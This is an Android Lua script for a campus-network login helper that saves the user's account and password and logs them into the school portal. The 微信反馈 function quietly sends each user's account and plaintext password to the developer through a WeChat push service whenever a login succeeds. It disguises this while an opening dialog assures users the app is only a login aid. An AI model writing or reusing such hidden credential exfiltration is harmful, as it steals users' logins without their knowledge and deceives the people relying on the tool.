import 'android.webkit.WebView'webView.addJavascriptInterface({},'JsInterface')
import 'test'
cjson=require ("cjson") --解析json字符
--程序启动时会执行的事件
泡沫对话框(421)
.设置标题("声明(首次安装提示)")
.设置消息([[本软件不具有破解校网作用只是一个登陆助手。]])
.设置积极按钮("确定",function()
  显示消息("欢迎使用")
end)
.设置消极按钮("取消")
.显示()
function 写文件(名称,内容)
  文件路径="/sdcard/校网助手/"..名称
  io.open(文件路径,'w'):write(内容):close()
end
当前版本="8.1"
function 检查更新()
  local url="https://www.cnblogs.com/pengwenzheng/p/8553104.html"
  --sj(m,"txt":"","state",m)
  Http.get(url,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      local con=content
      --string.match("左测试测试右","左(.-)右")
      local 版本号=con.match(con,"版本号【(.-)】")
      local 更新内容=con.match(con,"更新内容【(.-)】")
      local 下载链接=con.match(con,"下载链接【(.-)】")
      local 公告=con.match(con,"公告【(.-)】")
      local 广告=con.match(con,"广告【(.-)】")
      if (版本号>当前版本) then
        对话框()
        .设置标题("版本更新")
        .设置消息(公告)
        .设置积极按钮("下载更新",function()
          加载网页(下载链接)
        end)
        .设置消极按钮("取消")
        .显示()
      end
    else
      print("获取更新数据失败"..code)
    end
  end)
end
function 微信反馈()
  local zh=io.open("/sdcard/校网助手/账户.txt"):read("*a")
  local z=zh:match("(.+)&")
  local m=zh:match("upass=(.+)")
  local time=os.date("%Y-%m-%d %H:%M:%S")
  local ww="https://sc.ftqq.com/SCU26231T3d328ea1d7ec6bf5e619d412b2937b0e5af42e7d782a3.send?text="
  local x="主人校网助手有人上线了！账号:"
  local g="密码为:"
  local k="&desp="
  local wx =ww..x..z..k..time..g..m
  Http.get(wx,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      --print(content)
    else
      print("与后台通信异常"..code)
    end
  end)
end
function 登陆()
  InputLayout={
    LinearLayout;
    orientation="vertical";
    Focusable=true,
    FocusableInTouchMode=true,
    {
      TextView;
      id="Prompt",
      textSize="15sp",
      layout_marginTop="10dp";
      layout_marginLeft="3dp",
      layout_width="80%w";
      layout_gravity="center",
      text="运营商输入:移动，联通，电信，单宽";
    };
    {
      EditText;
      hint="账号";
      layout_marginTop="5dp";
      layout_width="80%w";
      layout_gravity="center",
      id="edit";
    };
    {
      EditText;
      hint="密码";
      layout_marginTop="5dp";
      layout_width="80%w";
      layout_gravity="center",
      id="edit2";
    };
    {
      EditText;
      hint="运营商";
      layout_marginTop="5dp";
      layout_width="80%w";
      layout_gravity="center",
      id="edit3";
    };
  };
  AlertDialog.Builder(this)
  .setTitle("首次登陆")
  .setView(loadlayout(InputLayout))
  .setPositiveButton("确定",{onClick=function(v) 
      if edit3.Text=="移动"then
        yys="cmcc"
      elseif edit3.Text=="联通"then
        yys="unicom"
      elseif edit3.Text=="电信"then
        yys="telecom"
      else
        yys="founder"
      end
      local 拼接=edit.Text.."@"..yys.."&upass="..edit2.Text
      写文件("账户.txt",拼接)
    end})
  .setNegativeButton("取消",nil)
  .show()
end
function 检验()
  jyurl="http://1.1.1.1"
  Http.get(jyurl,nil,"gb2312",nil,function (code,content,cookie,header)
    if(code==200 and content)then
      title=content.match(content,"<title>(.-)</title>")
      return title
    else
      print("本地检验异常"..code)
    end
  end)
end
function 语录()
  local url="http://word.rainss.cn/api_system.php?type=json"
  --sj(m,"txt":"","state",m)
  Http.get(url,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      local json=cjson.decode(content)
      -- print(dump(json))--输出json字符
      --print(json.txt)
      local output=json.txt
      对话框()
      .设置标题("登陆成功-语录")
      .设置消息(output)
      .设置积极按钮("确定",function()
        显示消息("加油努力！")
      end)
      .设置消极按钮("取消")
      .显示()
    else
      print("获取语录异常"..code)
    end
  end)
end
function post()
  ip=findip()
  ip=string.gsub(ip," ","")
  print("您的动态ip为"..ip)
  url="http://1.1.1.1:801/eportal/?c=ACSetting&a=Login&protocol=http:&hostname=1.1.1.1&iTermType=2&wlanuserip="
  url1="&wlanacip=10.10.9.200&mac=00-00-00-00-00-00&ip="
  url2="&enAdvert=0&queryACIP=0&loginMethod=1"
  url3=url..ip..url1..url2
  zh=io.open("/sdcard/校网助手/账户.txt"):read("*a")
  data="DDDDD="..zh.."&R1=0&R2=0&R3=0&R6=1&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=Y"
  data=string.gsub(data," ","")
  Http.post(url3,data,nil,"gb2312",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      jyurl="http://1.1.1.1"
      Http.get(jyurl,nil,"gb2312",nil,function (code,content,cookie,header)
        if(code==200 and content)then
          title=content.match(content,"<title>(.-)</title>")
         -- print(title)
          if (title=="注销页") then
            print("登陆成功")
            语录()
            微信反馈()
            检查更新()
          else
            print("登陆失败……自动尝试二次登陆。")
            Http.post(url3,data,nil,"gb2312",nil,function(code,content,cookie,header)
              if(code==200 and content)then
                jyurl="http://1.1.1.1"
                Http.get(jyurl,nil,"gb2312",nil,function (code,content,cookie,header)
                  if(code==200 and content)then
                    title=content.match(content,"<title>(.-)</title>")
                    print(title)
                    if (title=="注销页") then
                      print("登陆成功")
                      语录()
                      微信反馈()
                      检查更新()
                    end
                  end
                end)
              end
            end)
          end
          --检测校网是否登陆
        end
      end) 

    else
      print("post发包异常"..code)
    end
  end)
end
function 检测Wifi()
  import "android.content.Context"
  wifi = activity.Context.getSystemService(Context.WIFI_SERVICE)
  wi = wifi.isWifiEnabled()
  return wi
end
function findip()
  wifi = activity.Context.getSystemService(Context.WIFI_SERVICE).getDhcpInfo()
  ip=string.match(tostring(wifi),"ipaddr(.-)gate")
  return ip
end
function main()
  if 检测Wifi() then
    post()
  else
    对话框()
    .设置标题("错误")
    .设置消息("检测到您未开启Wifi")
    .设置积极按钮("确定",function()
      显示消息("点击了确定")
    end)
    .设置消极按钮("取消")
    .显示()
  end
end
function 主程序()
  import "java.io.File"--导入File类
  路径="/sdcard/校网助手/"
  if File(路径).exists() then
    print("欢迎回来")
    main()
    --io.open(文件路径):read("*a")
  else
    print("您是首次使用本软件……")
    File(路径).mkdir()
    登陆()
  end
end
主程序()